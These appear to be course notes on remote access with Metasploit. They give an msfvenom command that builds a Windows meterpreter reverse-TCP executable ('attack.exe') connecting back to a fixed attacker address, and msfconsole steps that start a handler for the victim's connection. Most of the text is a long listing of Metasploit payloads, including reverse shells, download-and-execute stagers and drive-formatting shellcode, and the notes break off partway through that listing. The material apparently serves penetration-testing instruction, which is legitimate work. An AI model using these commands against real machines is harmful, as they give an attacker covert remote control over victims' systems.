#### Video 51 Notes

##### Remote Access

---

- Reverse Shell with MSF and Meterpreter
  - Create payload  
  - Enable Server 
  - Victim builds connection

#### msfvenom usage example
```
root@kali:~/# msfvenom -h
MsfVenom - a Metasploit standalone payload generator.
Also a replacement for msfpayload and msfencode.
Usage: /usr/bin/msfvenom [options] <var=val>

Options:
    -p, --payload       <payload>    Payload to use. Specify a '-' or stdin to use custom payloads
        --payload-options            List the payload's standard options
    -l, --list          [type]       List a module type. Options are: payloads, encoders, nops, all
    -n, --nopsled       <length>     Prepend a nopsled of [length] size on to the payload
    -f, --format        <format>     Output format (use --help-formats for a list)
        --help-formats               List available formats
    -e, --encoder       <encoder>    The encoder to use
    -a, --arch          <arch>       The architecture to use
        --platform      <platform>   The platform of the payload
        --help-platforms             List available platforms
    -s, --space         <length>     The maximum size of the resulting payload
        --encoder-space <length>     The maximum size of the encoded payload (defaults to the -s value)
    -b, --bad-chars     <list>       The list of characters to avoid example: '\x00\xff'
    -i, --iterations    <count>      The number of times to encode the payload
    -c, --add-code      <path>       Specify an additional win32 shellcode file to include
    -x, --template      <path>       Specify a custom executable file to use as a template
    -k, --keep                       Preserve the template behavior and inject the payload as a new thread
    -o, --out           <path>       Save the payload
    -v, --var-name      <name>       Specify a custom variable name to use for certain output formats
        --smallest                   Generate the smallest possible payload
    -h, --help                       Show this message
root@kali:~/# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.109 LPORT=1234 --format=exe > attack.exe
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 333 bytes
Final size of exe file: 73802 bytes
```

#### Listening on metasploit
```
rot0xd@kali:~$ msfconsole -q
msf > use exploit/multi/handler
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST 192.168.1.109
LHOST => 192.168.1.109
msf exploit(handler) > set LPORT 1234
LPORT => 1234
msf exploit(handler) > show options 

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.1.109    yes       The listen address
   LPORT     1234             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf exploit(handler) > exploit -h
Usage: exploit [options]

Launches an exploitation attempt.

OPTIONS:

    -e <opt>  The payload encoder to use.  If none is specified, ENCODER is used.
    -f        Force the exploit to run regardless of the value of MinimumRank.
    -h        Help banner.
    -j        Run in the context of a job.
    -n <opt>  The NOP generator to use.  If none is specified, NOP is used.
    -o <opt>  A comma separated list of options in VAR=VAL format.
    -p <opt>  The payload to use.  If none is specified, PAYLOAD is used.
    -t <opt>  The target index to use.  If none is specified, TARGET is used.
    -z        Do not interact with the session after successful exploitation.

msf exploit(handler) > exploit -j -z
[*] Exploit running as background job.
[*] Started reverse TCP handler on 192.168.1.109:1234 
```


#### Output of `msfvenom --list all`
```
rot0xd@kali:~$ msfvenom --list all
Framework Payloads (458 total)
==============================

    Name                                                Description
    ----                                                -----------
    aix/ppc/shell_bind_tcp                              Listen for a connection and spawn a command shell
    aix/ppc/shell_find_port                             Spawn a shell on an established connection
    aix/ppc/shell_interact                              Simply execve /bin/sh (for inetd programs)
    aix/ppc/shell_reverse_tcp                           Connect back to attacker and spawn a command shell
    android/meterpreter/reverse_http                    Run a meterpreter server on Android. Tunnel communication over HTTP
    android/meterpreter/reverse_https                   Run a meterpreter server on Android. Tunnel communication over HTTPS
    android/meterpreter/reverse_tcp                     Run a meterpreter server on Android. Connect back stager
    android/meterpreter_reverse_http                    Connect back to attacker and spawn a Meterpreter shell
    android/meterpreter_reverse_tcp                     Connect back to the attacker and spawn a Meterpreter shell
    android/shell/reverse_http                          Spawn a piped command shell (sh). Tunnel communication over HTTP
    android/shell/reverse_https                         Spawn a piped command shell (sh). Tunnel communication over HTTPS
    android/shell/reverse_tcp                           Spawn a piped command shell (sh). Connect back stager
    bsd/sparc/shell_bind_tcp                            Listen for a connection and spawn a command shell
    bsd/sparc/shell_reverse_tcp                         Connect back to attacker and spawn a command shell
    bsd/x64/exec                                        Execute an arbitrary command
    bsd/x64/shell_bind_ipv6_tcp                         Listen for a connection and spawn a command shell over IPv6
    bsd/x64/shell_bind_tcp                              Bind an arbitrary command to an arbitrary port
    bsd/x64/shell_bind_tcp_small                        Listen for a connection and spawn a command shell
    bsd/x64/shell_reverse_ipv6_tcp                      Connect back to attacker and spawn a command shell over IPv6
    bsd/x64/shell_reverse_tcp                           Connect back to attacker and spawn a command shell
    bsd/x64/shell_reverse_tcp_small                     Connect back to attacker and spawn a command shell
    bsd/x86/exec                                        Execute an arbitrary command
    bsd/x86/metsvc_bind_tcp                             Stub payload for interacting with a Meterpreter Service
    bsd/x86/metsvc_reverse_tcp                          Stub payload for interacting with a Meterpreter Service
    bsd/x86/shell/bind_ipv6_tcp                         Spawn a command shell (staged). Listen for a connection over IPv6
    bsd/x86/shell/bind_tcp                              Spawn a command shell (staged). Listen for a connection
    bsd/x86/shell/find_tag                              Spawn a command shell (staged). Use an established connection
    bsd/x86/shell/reverse_ipv6_tcp                      Spawn a command shell (staged). Connect back to the attacker over IPv6
    bsd/x86/shell/reverse_tcp                           Spawn a command shell (staged). Connect back to the attacker
    bsd/x86/shell_bind_tcp                              Listen for a connection and spawn a command shell
    bsd/x86/shell_bind_tcp_ipv6                         Listen for a connection and spawn a command shell over IPv6
    bsd/x86/shell_find_port                             Spawn a shell on an established connection
    bsd/x86/shell_find_tag                              Spawn a shell on an established connection (proxy/nat safe)
    bsd/x86/shell_reverse_tcp                           Connect back to attacker and spawn a command shell
    bsd/x86/shell_reverse_tcp_ipv6                      Connect back to attacker and spawn a command shell over IPv6
    bsdi/x86/shell/bind_tcp                             Spawn a command shell (staged). Listen for a connection
    bsdi/x86/shell/reverse_tcp                          Spawn a command shell (staged). Connect back to the attacker
    bsdi/x86/shell_bind_tcp                             Listen for a connection and spawn a command shell
    bsdi/x86/shell_find_port                            Spawn a shell on an established connection
    bsdi/x86/shell_reverse_tcp                          Connect back to attacker and spawn a command shell
    cmd/mainframe/generic_jcl                           Provide JCL which can be used to submit a job to JES2 on z/OS which will exit and return 0. This can be used as a template for other JCL based payloads
    cmd/mainframe/reverse_shell_jcl                     Provide JCL which creates a reverse shell This implmentation does not include ebcdic character translation, so a client with translation capabilities is required. MSF handles this automatically.
    cmd/unix/bind_awk                                   Listen for a connection and spawn a command shell via GNU AWK
    cmd/unix/bind_inetd                                 Listen for a connection and spawn a command shell (persistent)
    cmd/unix/bind_lua                                   Listen for a connection and spawn a command shell via Lua
    cmd/unix/bind_netcat                                Listen for a connection and spawn a command shell via netcat
    cmd/unix/bind_netcat_gaping                         Listen for a connection and spawn a command shell via netcat
    cmd/unix/bind_netcat_gaping_ipv6                    Listen for a connection and spawn a command shell via netcat
    cmd/unix/bind_nodejs                                Continually listen for a connection and spawn a command shell via nodejs
    cmd/unix/bind_perl                                  Listen for a connection and spawn a command shell via perl
    cmd/unix/bind_perl_ipv6                             Listen for a connection and spawn a command shell via perl
    cmd/unix/bind_ruby                                  Continually listen for a connection and spawn a command shell via Ruby
    cmd/unix/bind_ruby_ipv6                             Continually listen for a connection and spawn a command shell via Ruby
    cmd/unix/bind_zsh                                   Listen for a connection and spawn a command shell via Zsh. Note: Although Zsh is often available, please be aware it isn't usually installed by default.
    cmd/unix/generic                                    Executes the supplied command
    cmd/unix/interact                                   Interacts with a shell on an established socket connection
    cmd/unix/reverse                                    Creates an interactive shell through two inbound connections
    cmd/unix/reverse_awk                                Creates an interactive shell via GNU AWK
    cmd/unix/reverse_bash                               Creates an interactive shell via bash's builtin /dev/tcp. This will not work on most Debian-based Linux distributions (including Ubuntu) because they compile bash without the /dev/tcp feature.
    cmd/unix/reverse_bash_telnet_ssl                    Creates an interactive shell via mkfifo and telnet. This method works on Debian and other systems compiled without /dev/tcp support. This module uses the '-z' option included on some systems to encrypt using SSL.
    cmd/unix/reverse_lua                                Creates an interactive shell via Lua
    cmd/unix/reverse_netcat                             Creates an interactive shell via netcat
    cmd/unix/reverse_netcat_gaping                      Creates an interactive shell via netcat
    cmd/unix/reverse_nodejs                             Continually listen for a connection and spawn a command shell via nodejs
    cmd/unix/reverse_openssl                            Creates an interactive shell through two inbound connections
    cmd/unix/reverse_perl                               Creates an interactive shell via perl
    cmd/unix/reverse_perl_ssl                           Creates an interactive shell via perl, uses SSL
    cmd/unix/reverse_php_ssl                            Creates an interactive shell via php, uses SSL
    cmd/unix/reverse_python                             Connect back and create a command shell via Python
    cmd/unix/reverse_python_ssl                         Creates an interactive shell via python, uses SSL, encodes with base64 by design.
    cmd/unix/reverse_ruby                               Connect back and create a command shell via Ruby
    cmd/unix/reverse_ruby_ssl                           Connect back and create a command shell via Ruby, uses SSL
    cmd/unix/reverse_ssl_double_telnet                  Creates an interactive shell through two inbound connections, encrypts using SSL via "-z" option
    cmd/unix/reverse_zsh                                Connect back and create a command shell via Zsh. Note: Although Zsh is often available, please be aware it isn't usually installed by default.
    cmd/windows/adduser                                 Create a new user and add them to local administration group. Note: The specified password is checked for common complexity requirements to prevent the target machine rejecting the user for failing to meet policy requirements. Complexity check: 8-14 chars (1 UPPER, 1 lower, 1 digit/special)
    cmd/windows/bind_lua                                Listen for a connection and spawn a command shell via Lua
    cmd/windows/bind_perl                               Listen for a connection and spawn a command shell via perl (persistent)
    cmd/windows/bind_perl_ipv6                          Listen for a connection and spawn a command shell via perl (persistent)
    cmd/windows/bind_ruby                               Continually listen for a connection and spawn a command shell via Ruby
    cmd/windows/download_eval_vbs                       Downloads a file from an HTTP(S) URL and executes it as a vbs script. Use it to stage a vbs encoded payload from a short command line.
    cmd/windows/download_exec_vbs                       Download an EXE from an HTTP(S) URL and execute it
    cmd/windows/generic                                 Executes the supplied command
    cmd/windows/powershell_bind_tcp                     Interacts with a powershell session on an established socket connection
    cmd/windows/powershell_reverse_tcp                  Interacts with a powershell session on an established socket connection
    cmd/windows/reverse_lua                             Creates an interactive shell via Lua
    cmd/windows/reverse_perl                            Creates an interactive shell via perl
    cmd/windows/reverse_powershell                      Connect back and create a command shell via Powershell
    cmd/windows/reverse_ruby                            Connect back and create a command shell via Ruby
    firefox/exec                                        This module runs a shell command on the target OS withough touching the disk. On Windows, this command will flash the command prompt momentarily. This can be avoided by setting WSCRIPT to true, which drops a jscript "launcher" to disk that hides the prompt.
    firefox/shell_bind_tcp                              Creates an interactive shell via Javascript with access to Firefox's XPCOM API
    firefox/shell_reverse_tcp                           Creates an interactive shell via Javascript with access to Firefox's XPCOM API
    generic/custom                                      Use custom string or file as payload. Set either PAYLOADFILE or PAYLOADSTR.
    generic/debug_trap                                  Generate a debug trap in the target process
    generic/shell_bind_tcp                              Listen for a connection and spawn a command shell
    generic/shell_reverse_tcp                           Connect back to attacker and spawn a command shell
    generic/tight_loop                                  Generate a tight loop in the target process
    java/jsp_shell_bind_tcp                             Listen for a connection and spawn a command shell
    java/jsp_shell_reverse_tcp                          Connect back to attacker and spawn a command shell
    java/meterpreter/bind_tcp                           Run a meterpreter server in Java. Listen for a connection
    java/meterpreter/reverse_http                       Run a meterpreter server in Java. Tunnel communication over HTTP
    java/meterpreter/reverse_https                      Run a meterpreter server in Java. Tunnel communication over HTTPS
    java/meterpreter/reverse_tcp                        Run a meterpreter server in Java. Connect back stager
    java/shell/bind_tcp                                 Spawn a piped command shell (cmd.exe on Windows, /bin/sh everywhere else). Listen for a connection
    java/shell/reverse_tcp                              Spawn a piped command shell (cmd.exe on Windows, /bin/sh everywhere else). Connect back stager
    java/shell_reverse_tcp                              Connect back to attacker and spawn a command shell
    linux/armbe/shell_bind_tcp                          Listen for a connection and spawn a command shell
    linux/armle/adduser                                 Create a new user with UID 0
    linux/armle/exec                                    Execute an arbitrary command
    linux/armle/mettle/bind_tcp                         Inject the mettle server payload (staged). Listen for a connection
    linux/armle/mettle/reverse_tcp                      Inject the mettle server payload (staged). Connect back to the attacker
    linux/armle/shell/bind_tcp                          dup2 socket in r12, then execve. Listen for a connection
    linux/armle/shell/reverse_tcp                       dup2 socket in r12, then execve. Connect back to the attacker
    linux/armle/shell_bind_tcp                          Connect to target and spawn a command shell
    linux/armle/shell_reverse_tcp                       Connect back to attacker and spawn a command shell
    linux/mipsbe/exec                                   A very small shellcode for executing commands. This module is sometimes helpful for testing purposes.
    linux/mipsbe/mettle/reverse_tcp                     Inject the mettle server payload (staged). Connect back to the attacker
    linux/mipsbe/reboot                                 A very small shellcode for rebooting the system. This payload is sometimes helpful for testing purposes or executing other payloads that rely on initial startup procedures.
    linux/mipsbe/shell/reverse_tcp                      Spawn a command shell (staged). Connect back to the attacker
    linux/mipsbe/shell_bind_tcp                         Listen for a connection and spawn a command shell
    linux/mipsbe/shell_reverse_tcp                      Connect back to attacker and spawn a command shell
    linux/mipsle/exec                                   A very small shellcode for executing commands. This module is sometimes helpful for testing purposes as well as on targets with extremely limited buffer space.
    linux/mipsle/mettle/reverse_tcp                     Inject the mettle server payload (staged). Connect back to the attacker
    linux/mipsle/reboot                                 A very small shellcode for rebooting the system. This payload is sometimes helpful for testing purposes.
    linux/mipsle/shell/reverse_tcp                      Spawn a command shell (staged). Connect back to the attacker
    linux/mipsle/shell_bind_tcp                         Listen for a connection and spawn a command shell
    linux/mipsle/shell_reverse_tcp                      Connect back to attacker and spawn a command shell
    linux/ppc/shell_bind_tcp                            Listen for a connection and spawn a command shell
    linux/ppc/shell_find_port                           Spawn a shell on an established connection
    linux/ppc/shell_reverse_tcp                         Connect back to attacker and spawn a command shell
    linux/ppc64/shell_bind_tcp                          Listen for a connection and spawn a command shell
    linux/ppc64/shell_find_port                         Spawn a shell on an established connection
    linux/ppc64/shell_reverse_tcp                       Connect back to attacker and spawn a command shell
    linux/x64/exec                                      Execute an arbitrary command
    linux/x64/mettle/bind_tcp                           Inject the mettle server payload (staged). Listen for a connection
    linux/x64/mettle/reverse_tcp                        Inject the mettle server payload (staged). Connect back to the attacker
    linux/x64/shell/bind_tcp                            Spawn a command shell (staged). Listen for a connection
    linux/x64/shell/reverse_tcp                         Spawn a command shell (staged). Connect back to the attacker
    linux/x64/shell_bind_tcp                            Listen for a connection and spawn a command shell
    linux/x64/shell_bind_tcp_random_port                Listen for a connection in a random port and spawn a command shell. Use nmap to discover the open port: 'nmap -sS target -p-'.
    linux/x64/shell_find_port                           Spawn a shell on an established connection
    linux/x64/shell_reverse_tcp                         Connect back to attacker and spawn a command shell
    linux/x86/adduser                                   Create a new user with UID 0
    linux/x86/chmod                                     Runs chmod on specified file with specified mode
    linux/x86/exec                                      Execute an arbitrary command
    linux/x86/meterpreter/bind_ipv6_tcp                 Inject the meterpreter server payload (staged). Listen for an IPv6 connection (Linux x86)
    linux/x86/meterpreter/bind_ipv6_tcp_uuid            Inject the meterpreter server payload (staged). Listen for an IPv6 connection with UUID Support (Linux x86)
    linux/x86/meterpreter/bind_nonx_tcp                 Inject the meterpreter server payload (staged). Listen for a connection
    linux/x86/meterpreter/bind_tcp                      Inject the meterpreter server payload (staged). Listen for a connection (Linux x86)
    linux/x86/meterpreter/bind_tcp_uuid                 Inject the meterpreter server payload (staged). Listen for a connection with UUID Support (Linux x86)
    linux/x86/meterpreter/find_tag                      Inject the meterpreter server payload (staged). Use an established connection
    linux/x86/meterpreter/reverse_ipv6_tcp              Inject the meterpreter server payload (staged). Connect back to attacker over IPv6
    linux/x86/meterpreter/reverse_nonx_tcp              Inject the meterpreter server payload (staged). Connect back to the attacker
    linux/x86/meterpreter/reverse_tcp                   Inject the meterpreter server payload (staged). Connect back to the attacker
    linux/x86/meterpreter/reverse_tcp_uuid              Inject the meterpreter server payload (staged). Connect back to the attacker
    linux/x86/metsvc_bind_tcp                           Stub payload for interacting with a Meterpreter Service
    linux/x86/metsvc_reverse_tcp                        Stub payload for interacting with a Meterpreter Service
    linux/x86/mettle/bind_ipv6_tcp                      Inject the mettle server payload (staged). Listen for an IPv6 connection (Linux x86)
    linux/x86/mettle/bind_ipv6_tcp_uuid                 Inject the mettle server payload (staged). Listen for an IPv6 connection with UUID Support (Linux x86)
    linux/x86/mettle/bind_nonx_tcp                      Inject the mettle server payload (staged). Listen for a connection
    linux/x86/mettle/bind_tcp                           Inject the mettle server payload (staged). Listen for a connection (Linux x86)
    linux/x86/mettle/bind_tcp_uuid                      Inject the mettle server payload (staged). Listen for a connection with UUID Support (Linux x86)
    linux/x86/mettle/find_tag                           Inject the mettle server payload (staged). Use an established connection
    linux/x86/mettle/reverse_ipv6_tcp                   Inject the mettle server payload (staged). Connect back to attacker over IPv6
    linux/x86/mettle/reverse_nonx_tcp                   Inject the mettle server payload (staged). Connect back to the attacker
    linux/x86/mettle/reverse_tcp                        Inject the mettle server payload (staged). Connect back to the attacker
    linux/x86/mettle/reverse_tcp_uuid                   Inject the mettle server payload (staged). Connect back to the attacker
    linux/x86/read_file                                 Read up to 4096 bytes from the local file system and write it back out to the specified file descriptor
    linux/x86/shell/bind_ipv6_tcp                       Spawn a command shell (staged). Listen for an IPv6 connection (Linux x86)
    linux/x86/shell/bind_ipv6_tcp_uuid                  Spawn a command shell (staged). Listen for an IPv6 connection with UUID Support (Linux x86)
    linux/x86/shell/bind_nonx_tcp                       Spawn a command shell (staged). Listen for a connection
    linux/x86/shell/bind_tcp                            Spawn a command shell (staged). Listen for a connection (Linux x86)
    linux/x86/shell/bind_tcp_uuid                       Spawn a command shell (staged). Listen for a connection with UUID Support (Linux x86)
    linux/x86/shell/find_tag                            Spawn a command shell (staged). Use an established connection
    linux/x86/shell/reverse_ipv6_tcp                    Spawn a command shell (staged). Connect back to attacker over IPv6
    linux/x86/shell/reverse_nonx_tcp                    Spawn a command shell (staged). Connect back to the attacker
    linux/x86/shell/reverse_tcp                         Spawn a command shell (staged). Connect back to the attacker
    linux/x86/shell/reverse_tcp_uuid                    Spawn a command shell (staged). Connect back to the attacker
    linux/x86/shell_bind_ipv6_tcp                       Listen for a connection over IPv6 and spawn a command shell
    linux/x86/shell_bind_tcp                            Listen for a connection and spawn a command shell
    linux/x86/shell_bind_tcp_random_port                Listen for a connection in a random port and spawn a command shell. Use nmap to discover the open port: 'nmap -sS target -p-'.
    linux/x86/shell_find_port                           Spawn a shell on an established connection
    linux/x86/shell_find_tag                            Spawn a shell on an established connection (proxy/nat safe)
    linux/x86/shell_reverse_tcp                         Connect back to attacker and spawn a command shell
    mainframe/shell_reverse_tcp                         Listen for a connection and spawn a command shell. This implmentation does not include ebcdic character translation, so a client with translation capabilities is required. MSF handles this automatically.
    netware/shell/reverse_tcp                           Connect to the NetWare console (staged). Connect back to the attacker
    nodejs/shell_bind_tcp                               Creates an interactive shell via nodejs
    nodejs/shell_reverse_tcp                            Creates an interactive shell via nodejs
    nodejs/shell_reverse_tcp_ssl                        Creates an interactive shell via nodejs, uses SSL
    osx/armle/execute/bind_tcp                          Spawn a command shell (staged). Listen for a connection
    osx/armle/execute/reverse_tcp                       Spawn a command shell (staged). Connect back to the attacker
    osx/armle/shell/bind_tcp                            Spawn a command shell (staged). Listen for a connection
    osx/armle/shell/reverse_tcp                         Spawn a command shell (staged). Connect back to the attacker
    osx/armle/shell_bind_tcp                            Listen for a connection and spawn a command shell
    osx/armle/shell_reverse_tcp                         Connect back to attacker and spawn a command shell
    osx/armle/vibrate                                   Causes the iPhone to vibrate, only works when the AudioToolkit library has been loaded. Based on work by Charlie Miller <cmiller[at]securityevaluators.com>.
    osx/ppc/shell/bind_tcp                              Spawn a command shell (staged). Listen for a connection
    osx/ppc/shell/find_tag                              Spawn a command shell (staged). Use an established connection
    osx/ppc/shell/reverse_tcp                           Spawn a command shell (staged). Connect back to the attacker
    osx/ppc/shell_bind_tcp                              Listen for a connection and spawn a command shell
    osx/ppc/shell_reverse_tcp                           Connect back to attacker and spawn a command shell
    osx/x64/dupandexecve/bind_tcp                       dup2 socket in edi, then execve. Listen, read length, read buffer, execute
    osx/x64/dupandexecve/reverse_tcp                    dup2 socket in edi, then execve. Connect, read length, read buffer, execute
    osx/x64/exec                                        Execute an arbitrary command
    osx/x64/say                                         Say an arbitrary string outloud using Mac OS X text2speech
    osx/x64/shell_bind_tcp                              Bind an arbitrary command to an arbitrary port
    osx/x64/shell_find_tag                              Spawn a shell on an established connection (proxy/nat safe)
    osx/x64/shell_reverse_tcp                           Connect back to attacker and spawn a command shell
    osx/x86/bundleinject/bind_tcp                       Inject a custom Mach-O bundle into the exploited process. Listen, read length, read buffer, execute
    osx/x86/bundleinject/reverse_tcp                    Inject a custom Mach-O bundle into the exploited process. Connect, read length, read buffer, execute
    osx/x86/exec                                        Execute an arbitrary command
    osx/x86/isight/bind_tcp                             Inject a Mach-O bundle to capture a photo from the iSight (staged). Listen, read length, read buffer, execute
    osx/x86/isight/reverse_tcp                          Inject a Mach-O bundle to capture a photo from the iSight (staged). Connect, read length, read buffer, execute
    osx/x86/shell_bind_tcp                              Listen for a connection and spawn a command shell
    osx/x86/shell_find_port                             Spawn a shell on an established connection
    osx/x86/shell_reverse_tcp                           Connect back to attacker and spawn a command shell
    osx/x86/vforkshell/bind_tcp                         Call vfork() if necessary and spawn a command shell (staged). Listen, read length, read buffer, execute
    osx/x86/vforkshell/reverse_tcp                      Call vfork() if necessary and spawn a command shell (staged). Connect, read length, read buffer, execute
    osx/x86/vforkshell_bind_tcp                         Listen for a connection, vfork if necessary, and spawn a command shell
    osx/x86/vforkshell_reverse_tcp                      Connect back to attacker, vfork if necessary, and spawn a command shell
    php/bind_perl                                       Listen for a connection and spawn a command shell via perl (persistent)
    php/bind_perl_ipv6                                  Listen for a connection and spawn a command shell via perl (persistent) over IPv6
    php/bind_php                                        Listen for a connection and spawn a command shell via php
    php/bind_php_ipv6                                   Listen for a connection and spawn a command shell via php (IPv6)
    php/download_exec                                   Download an EXE from an HTTP URL and execute it
    php/exec                                            Execute a single system command
    php/meterpreter/bind_tcp                            Run a meterpreter server in PHP. Listen for a connection
    php/meterpreter/bind_tcp_ipv6                       Run a meterpreter server in PHP. Listen for a connection over IPv6
    php/meterpreter/bind_tcp_ipv6_uuid                  Run a meterpreter server in PHP. Listen for a connection over IPv6 with UUID Support
    php/meterpreter/bind_tcp_uuid                       Run a meterpreter server in PHP. Listen for a connection with UUID Support
    php/meterpreter/reverse_tcp                         Run a meterpreter server in PHP. Reverse PHP connect back stager with checks for disabled functions
    php/meterpreter/reverse_tcp_uuid                    Run a meterpreter server in PHP. Reverse PHP connect back stager with checks for disabled functions
    php/meterpreter_reverse_tcp                         Connect back to attacker and spawn a Meterpreter server (PHP)
    php/reverse_perl                                    Creates an interactive shell via perl
    php/reverse_php                                     Reverse PHP connect back shell with checks for disabled functions
    php/shell_findsock                                  Spawn a shell on the established connection to the webserver. Unfortunately, this payload can leave conspicuous evil-looking entries in the apache error logs, so it is probably a good idea to use a bind or reverse shell unless firewalls prevent them from working. The issue this payload takes advantage of (CLOEXEC flag not set on sockets) appears to have been patched on the Ubuntu version of Apache and may not work on other Debian-based distributions. Only tested on Apache but it might work on other web servers that leak file descriptors to child processes.
    python/meterpreter/bind_tcp                         Run a meterpreter server in Python (2.5-2.7 & 3.1-3.5). Listen for a connection
    python/meterpreter/bind_tcp_uuid                    Run a meterpreter server in Python (2.5-2.7 & 3.1-3.5). Listen for a connection with UUID Support
    python/meterpreter/reverse_http                     Run a meterpreter server in Python (2.5-2.7 & 3.1-3.5). Tunnel communication over HTTP
    python/meterpreter/reverse_https                    Run a meterpreter server in Python (2.5-2.7 & 3.1-3.5). Tunnel communication over HTTP using SSL
    python/meterpreter/reverse_tcp                      Run a meterpreter server in Python (2.5-2.7 & 3.1-3.5). Connect back to the attacker
    python/meterpreter/reverse_tcp_ssl                  Run a meterpreter server in Python (2.5-2.7 & 3.1-3.5). Reverse Python connect back stager using SSL
    python/meterpreter/reverse_tcp_uuid                 Run a meterpreter server in Python (2.5-2.7 & 3.1-3.5). Connect back to the attacker with UUID Support
    python/meterpreter_bind_tcp                         Connect to the victim and spawn a Meterpreter shell
    python/meterpreter_reverse_http                     Connect back to the attacker and spawn a Meterpreter shell
    python/meterpreter_reverse_https                    Connect back to the attacker and spawn a Meterpreter shell
    python/meterpreter_reverse_tcp                      Connect back to the attacker and spawn a Meterpreter shell
    python/shell_reverse_tcp                            Creates an interactive shell via python, encodes with base64 by design. Compatible with Python 2.3.3
    python/shell_reverse_tcp_ssl                        Creates an interactive shell via python, uses SSL, encodes with base64 by design.
    ruby/shell_bind_tcp                                 Continually listen for a connection and spawn a command shell via Ruby
    ruby/shell_bind_tcp_ipv6                            Continually listen for a connection and spawn a command shell via Ruby
    ruby/shell_reverse_tcp                              Connect back and create a command shell via Ruby
    ruby/shell_reverse_tcp_ssl                          Connect back and create a command shell via Ruby, uses SSL
    solaris/sparc/shell_bind_tcp                        Listen for a connection and spawn a command shell
    solaris/sparc/shell_find_port                       Spawn a shell on an established connection
    solaris/sparc/shell_reverse_tcp                     Connect back to attacker and spawn a command shell
    solaris/x86/shell_bind_tcp                          Listen for a connection and spawn a command shell
    solaris/x86/shell_find_port                         Spawn a shell on an established connection
    solaris/x86/shell_reverse_tcp                       Connect back to attacker and spawn a command shell
    tty/unix/interact                                   Interacts with a TTY on an established socket connection
    windows/adduser                                     Create a new user and add them to local administration group. Note: The specified password is checked for common complexity requirements to prevent the target machine rejecting the user for failing to meet policy requirements. Complexity check: 8-14 chars (1 UPPER, 1 lower, 1 digit/special)
    windows/dllinject/bind_hidden_ipknock_tcp           Inject a DLL via a reflective loader. Listen for a connection. First, the port will need to be knocked from the IP defined in KHOST. This IP will work as an authentication method (you can spoof it with tools like hping). After that you could get your shellcode from any IP. The socket will appear as "closed," thus helping to hide the shellcode
    windows/dllinject/bind_hidden_tcp                   Inject a DLL via a reflective loader. Listen for a connection from a hidden port and spawn a command shell to the allowed host.
    windows/dllinject/bind_ipv6_tcp                     Inject a DLL via a reflective loader. Listen for an IPv6 connection (Windows x86)
    windows/dllinject/bind_ipv6_tcp_uuid                Inject a DLL via a reflective loader. Listen for an IPv6 connection with UUID Support (Windows x86)
    windows/dllinject/bind_nonx_tcp                     Inject a DLL via a reflective loader. Listen for a connection (No NX)
    windows/dllinject/bind_tcp                          Inject a DLL via a reflective loader. Listen for a connection (Windows x86)
    windows/dllinject/bind_tcp_rc4                      Inject a DLL via a reflective loader. Listen for a connection
    windows/dllinject/bind_tcp_uuid                     Inject a DLL via a reflective loader. Listen for a connection with UUID Support (Windows x86)
    windows/dllinject/find_tag                          Inject a DLL via a reflective loader. Use an established connection
    windows/dllinject/reverse_hop_http                  Inject a DLL via a reflective loader. Tunnel communication over an HTTP or HTTPS hop point. Note that you must first upload data/hop/hop.php to the PHP server you wish to use as a hop.
    windows/dllinject/reverse_http                      Inject a DLL via a reflective loader. Tunnel communication over HTTP (Windows wininet)
    windows/dllinject/reverse_http_proxy_pstore         Inject a DLL via a reflective loader. Tunnel communication over HTTP
    windows/dllinject/reverse_ipv6_tcp                  Inject a DLL via a reflective loader. Connect back to the attacker over IPv6
    windows/dllinject/reverse_nonx_tcp                  Inject a DLL via a reflective loader. Connect back to the attacker (No NX)
    windows/dllinject/reverse_ord_tcp                   Inject a DLL via a reflective loader. Connect back to the attacker
    windows/dllinject/reverse_tcp                       Inject a DLL via a reflective loader. Connect back to the attacker
    windows/dllinject/reverse_tcp_allports              Inject a DLL via a reflective loader. Try to connect back to the attacker, on all possible ports (1-65535, slowly)
    windows/dllinject/reverse_tcp_dns                   Inject a DLL via a reflective loader. Connect back to the attacker
    windows/dllinject/reverse_tcp_rc4                   Inject a DLL via a reflective loader. Connect back to the attacker
    windows/dllinject/reverse_tcp_rc4_dns               Inject a DLL via a reflective loader. Connect back to the attacker
    windows/dllinject/reverse_tcp_uuid                  Inject a DLL via a reflective loader. Connect back to the attacker with UUID Support
    windows/dllinject/reverse_winhttp                   Inject a DLL via a reflective loader. Tunnel communication over HTTP (Windows winhttp)
    windows/dns_txt_query_exec                          Performs a TXT query against a series of DNS record(s) and executes the returned payload
    windows/download_exec                               Download an EXE from an HTTP(S)/FTP URL and execute it
    windows/exec                                        Execute an arbitrary command
    windows/format_all_drives                           This payload formats all mounted disks in Windows (aka ShellcodeOfDeath). After formatting, this payload sets the volume label to the string specified in the VOLUMELABEL option. If the code is unable to access a drive for any reason, it skips the drive and proceeds to the next volume.
    windows/loadlibrary                                 Load an arbitrary library path
    windows/messagebox                                  Spawns a dialog via MessageBox using a customizable title, text & icon
    windows/meterpreter/bind_hidden_ipknock_tcp         Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Listen for a connection. First, the port will need to be knocked from the IP defined in KHOST. This IP will work as an authentication method (you can spoof it with tools like hping). After that you could get your shellcode from any IP. The socket will appear as "closed," thus helping to hide the shellcode
    windows/meterpreter/bind_hidden_tcp                 Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Listen for a connection from a hidden port and spawn a command shell to the allowed host.
    windows/meterpreter/bind_ipv6_tcp                   Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Listen for an IPv6 connection (Windows x86)
    windows/meterpreter/bind_ipv6_tcp_uuid              Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Listen for an IPv6 connection with UUID Support (Windows x86)
    windows/meterpreter/bind_nonx_tcp                   Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Listen for a connection (No NX)
    windows/meterpreter/bind_tcp                        Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Listen for a connection (Windows x86)
